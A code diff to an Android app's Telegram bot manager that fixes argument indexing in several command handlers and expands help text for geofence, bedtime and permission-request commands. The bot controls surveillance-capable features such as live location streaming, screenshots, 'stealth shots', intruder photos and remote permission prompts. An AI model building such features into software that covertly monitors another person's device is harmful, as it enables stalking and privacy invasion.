@@ -659,8 +659,8 @@ object TelegramBotManager {
                     "keytop" -> cmdKeyTop()
                     "shots", "screenshots" -> cmdShots(args)
                     "permissions", "perms" -> cmdPermissions()
-                    "openperms", "permopen" -> cmdOpenPerms(args.getOrNull(1) ?: "")
-                    "reqperm", "reqperms", "grantperm", "askperm", "permask" -> cmdReqPerm(args.getOrNull(1) ?: "")
+                    "openperms", "permopen" -> cmdOpenPerms(args.getOrNull(0) ?: "")
+                    "reqperm", "reqperms", "grantperm", "askperm", "permask" -> cmdReqPerm(args.getOrNull(0) ?: "")
                     "automations", "rules" -> cmdAutomations()
                     "newrule", "addrule" -> cmdNewRule(args)
                     "newschedule", "addschedule" -> cmdNewSchedule(args)
@@ -5470,7 +5470,9 @@ object TelegramBotManager {
                 append("• /livelocation [n] — Live location stream\n")
                 append("• /tracklocation [n] — Recent location points\n")
                 append("• /track — Tracking hub overview\n")
-                append("• /geofence — Geofence zones: list, add, delete, view events\n")
+                append("• /geofence — list all geofence zones with enable/disable & delete buttons\n")
+                append("  /geofence events — recent enter/exit event log\n")
+                append("  /geofence add — interactively add a new zone\n")
                 append("• /forwardgeofence [on|off] — Auto-forward geofence enter/exit alerts\n")
                 append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                 append("📱 <b>APPS</b>\n")
@@ -5501,7 +5503,9 @@ object TelegramBotManager {
                 append("• /volume [stream] [0-100] — Volume (media|ring|notification|alarm|call|system)\n")
                 append("• /reboot — Reboot device (requires root or Device Admin)\n")
                 append("• /setalarm HH:MM [label] — Set a system alarm\n")
-                append("• /bedtime — View / set the parental bedtime window\n")
+                append("• /bedtime — View bedtime state + inline controls\n")
+                append("  /bedtime on|off — enable or disable\n")
+                append("  /bedtime set HH:MM HH:MM — set start & end time (e.g. /bedtime set 22:00 06:30)\n")
                 append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                 append("📶 <b>NETWORK & CONNECTIVITY</b>\n")
                 append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
@@ -5612,7 +5616,8 @@ object TelegramBotManager {
                 append("• /openpage — Open any page in PlainApp on device — shows all pages as inline buttons\n")
                 append("• /permissions — Status of every app permission\n")
                 append("• /openperms [name] — Open a permission's settings screen directly on device\n")
-                append("• /reqperm — List all permissions as buttons — tap to trigger the grant dialog on device\n")
+                append("• /reqperm — List ALL permissions as inline buttons — tap any to trigger its grant dialog on device\n")
+                append("  /reqperm missing — show ONLY un-granted permissions as inline buttons\n")
                 append("• /intruders [n] — Intruder captures (photos taken on failed unlock attempts)\n")
                 append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                 append("🤖 <b>BOT CONTROL</b>\n")
@@ -8416,7 +8421,7 @@ object TelegramBotManager {
     // ─────────────────────────────────────────────────────────────────────────
 
     private fun cmdHotspot(args: List<String>) {
-        val arg = args.getOrNull(1)?.lowercase()
+        val arg = args.getOrNull(0)?.lowercase()
         val current = SystemControlHelper.getHotspotEnabled()
         if (arg == null) {
             sendMessage("📶 <b>Mobile Hotspot</b>\n\nStatus: ${if (current) "✅ ON" else "🔴 OFF"}\n\nUse <code>/hotspot on</code> or <code>/hotspot off</code> to control.")
@@ -8458,8 +8463,8 @@ object TelegramBotManager {
     // ─────────────────────────────────────────────────────────────────────────
 
     private suspend fun cmdBatteryAlert(args: List<String>) {
-        val sub = args.getOrNull(1)?.lowercase()
-        val threshArg = args.getOrNull(2)?.trimEnd('%')?.toIntOrNull()
+        val sub = args.getOrNull(0)?.lowercase()
+        val threshArg = args.getOrNull(1)?.trimEnd('%')?.toIntOrNull()
         when (sub) {
             "on", "enable", "1" -> {
                 forwardBatteryAlertEnabled = true
@@ -8484,7 +8489,7 @@ object TelegramBotManager {
     }
 
     private suspend fun cmdForwardGeofence(args: List<String>) {
-        val sub = args.getOrNull(1)?.lowercase()
+        val sub = args.getOrNull(0)?.lowercase()
         when (sub) {
             "on", "enable", "1" -> {
                 forwardGeofenceEnabled = true
@@ -8505,7 +8510,7 @@ object TelegramBotManager {
     }
 
     private suspend fun cmdForwardShots(args: List<String>) {
-        val sub = args.getOrNull(1)?.lowercase()
+        val sub = args.getOrNull(0)?.lowercase()
         when (sub) {
             "on", "enable", "1" -> {
                 forwardStealthShotsEnabled = true
